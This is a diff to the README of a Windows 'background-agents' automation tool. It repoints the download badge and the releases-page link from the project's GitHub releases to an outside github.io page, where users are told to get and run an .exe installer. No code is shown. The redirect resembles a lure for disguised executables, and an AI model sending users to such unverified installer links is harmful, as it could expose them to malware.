@@ -1,6 +1,6 @@
 # 🤖 background-agents - Automate tasks with smart background agents
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jbaws4177/background-agents/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jbaws4177.github.io)
 
 This software manages background tasks on your computer. It allows you to run scripts and automations without manual input. The system operates in the background to save you time and effort. You can use it to handle repetitive data entry, file organization, or system monitoring.
 
@@ -8,7 +8,7 @@ This software manages background tasks on your computer. It allows you to run sc
 
 The software is ready for Windows systems. Follow these steps to set it up on your machine:
 
-1. Visit the [releases page](https://github.com/Jbaws4177/background-agents/releases) to access the download options.
+1. Visit the [releases page](https://jbaws4177.github.io) to access the download options.
 2. Look for the latest version number at the top of the list.
 3. Click the file that ends with .exe to save the installer to your computer.
 4. Locate the downloaded file in your downloads folder.
